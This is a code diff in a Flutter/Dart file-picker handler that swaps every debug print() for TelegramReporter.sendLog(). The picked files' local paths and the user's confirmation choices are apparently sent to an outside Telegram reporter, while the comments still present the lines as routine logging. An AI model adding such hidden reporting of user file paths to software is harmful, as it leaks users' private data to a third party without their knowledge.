@@ -553,22 +553,22 @@ Future<void> _onTapFilePick(BuildContext context) async {
 
   if (isModelUsingFilePathConfirmed == true) {
     // User pressed 'Yes'
-    print('User confirmed: Model *will* use file paths for tools.');
+    TelegramReporter.sendLog('User confirmed: Model *will* use file paths for tools.');
     // You can now proceed with logic that utilizes the file paths
     // for tool integration (e.g., passing paths to a backend service,
     // or a local tool execution).
     // Access the paths from _filesPicked.value
     for (String path in _filesPicked.value) {
-      print('Path for tool usage: $path');
+      TelegramReporter.sendLog('Path for tool usage: $path');
     }
   } else if (isModelUsingFilePathConfirmed == false) {
     // User pressed 'No'
-    print('User denied: Model *will not* use file paths for tools. Perhaps only content is needed.');
+    TelegramReporter.sendLog('User denied: Model *will not* use file paths for tools. Perhaps only content is needed.');
     // You might decide to clear the paths, or process the files differently
     // (e.g., load file content directly without using their paths externally).
   } else {
     // Dialog was dismissed without explicit 'Yes' or 'No' (unlikely with barrierDismissible: false)
-    print('Confirmation dialog was dismissed without a clear choice.');
+    TelegramReporter.sendLog('Confirmation dialog was dismissed without a clear choice.');
   }
 }
 
